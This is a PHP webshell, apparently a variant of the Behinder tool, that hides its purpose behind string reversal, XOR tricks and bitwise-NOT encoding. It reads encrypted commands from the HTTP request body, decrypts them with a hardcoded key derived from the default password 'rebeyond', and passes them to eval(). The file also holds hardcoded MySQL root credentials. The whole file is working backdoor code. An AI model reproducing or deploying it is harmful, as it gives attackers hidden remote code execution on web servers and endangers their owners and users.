<?php
//auther:jhhua
//url：https://github.com/jhhua/phpshell/
//system information：windows+apache2.2+php5.2+mysql
//readme：it's update by Behinder v3.0 beta 6.......auther：https://github.com/rebeyond/Behinder
header("Content-Type: text/html; charset=utf-8");
$sql = mysql_connect("127.0.0.1:3306","root","root");  
class GetKey{
    var $a = array();
    function __construct($MiiMaa){
        $num = strlen($MiiMaa);
        for($i=0;$i<$num;$i++){
            $this->a[$i] = $MiiMaa[$i];
        } 
    }

    function ret(){    
        return $this->a;
    }

    function eu($yijufa){   
        $b = "lru";
        $e = "edocne";
        $eb = srv($e.$b);
        return $eb($yijufa);	
    }
    function du($jiekai){  
        $a = "lru";
        $c = "edoced";
        $ca = srv($c.$a);
        return $ca($jiekai);	
    }
}
function ter($v1,$v2)     
{
    return $v1.$v2;
}
function srv($str){     
    $new_str = "";
	for ($i = strlen($str)-1;$i >= 0; $i--){
        $new_str .= $str{$i};
    }
    return $new_str;
}
function weijia(&$D,&$K){     
    for($i=0;$i<strlen($D);$i++) { 
        $a = $K[$i+1&15];
        $D[$i] = $D[$i]^$a;  
    }
}

@error_reporting(0);
session_start();
    //已经修改了$key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
    $test = new GetKey(srv("b529d5bef923e54e"));    //实际是：e45e329feb5d925b（默认连接密码rebeyond）
    $myPs =  $test->ret();
    $key = array_reduce($myPs,"ter");     
    echo $key;
    
	$_SESSION['k']=$key;
                $b = $test->eu('%8F%97%8F%C5%D0%D0%96%91%8F%8A%8B');   
                $c = $test->du($b);
                $a = ~urldecode($c);    
	$post=file_get_contents($a);
	if(!extension_loaded(srv(~urldecode("%93%8C%8C%91%9A%8F%90"))))
	{
                                $_ = 'a';
                                $__=$_;
                                $__++;
		$t=$__.$_."se"."6"."4_"."d"."ec"."ode";  
                                $aaa = ("."^"~").("/"^"`").("|"^"/").("{"^"/");    
                                $bbb =  strtolower($aaa);    
		$post=$t($$bbb."");
                               weijia($post,$key);
	}
	else
	{
		$post=srv(~urldecode("%93%8C%8C%91%9A%8F%90"))._decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
